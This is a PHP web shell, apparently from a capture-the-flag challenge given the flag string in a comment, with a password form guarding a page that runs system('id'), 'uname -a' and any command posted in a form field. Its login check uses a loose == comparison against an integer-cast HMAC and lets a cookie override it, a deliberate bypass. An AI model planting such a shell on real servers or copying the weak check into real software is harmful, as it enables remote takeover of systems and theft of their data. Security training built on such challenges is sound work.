<?php
$pass1 = $_GET['pass1'];
$pass2 = $_GET['pass2'];
$secret = file_get_contents('../../secret'); // /var/www
$hmac_client = hash_hmac('sha256', $pass1, $pass2);
$hmac_server = hash_hmac('sha256', 'Gu%40$!mN0123', $secret);
$hmac_server =  (int)$hmac_server;
if($_COOKIE['token']){
    $hmac_client = $_COOKIE['token'];
}; 


if($hmac_client == $hmac_server):
    setcookie('token', $hmac_client);
?>
<html>
<head>
<style>
body {
  background-color: black;
}
</style>
</head>
<body>
<h1 style="color: #E41B17; text-align:center">B1Ng0_T34M_W3BSh3LL</h1>
<?php 
// uhc{_l0cal_f1l3_incLUs10n_byP455}
echo "<p style='color: #00FF00; text-align:center'>ID:  ";
system('id');
echo "</p>";

echo "<p style='color: #00FF00; text-align:center'>Uname:  ";
system("uname -a");
echo "</p>";
?>
  <form style="text-align: center" method="post" action="">
  <label style='color: #F70D1A' for="cmd">command --> </label>
  <input type="text" id="cmd" name="cmd"><br><br>
<?php
$cmd = $_POST['cmd'];
echo "<h1 style='color: #64E986; text-align:center'>~$ ";
system($cmd);
echo "</h1>";
?>
<img src="https://olhardigital.com.br/wp-content/uploads/2020/08/20200804113818.jpg" alt="Anonymous" width="500" height="600">
</body>
<?php
else :
?> 
<html>
<head>
<title>. _.</title>
</head>
<body>
<form name="loginForm" method="get" action="webshell.php">
<table width="20%" bgcolor="#95B9C7" align="center">

<tr>
<td colspan=2><center><font size=4><b>--------------------------</b></font></center></td>
</tr>

<tr>
<td>pass1:</td>
<td><input type="Password" size=25 name="pass1"></td>
</tr>

<tr>
<td>pass2:</td>
<td><input type="Password" size=25 name="pass2"></td>
</tr>
<td><input type="submit" onclick="return check(this.form)" value="Go"></td>
</table>
</form>
</body>
</html>
<?php
endif;
?>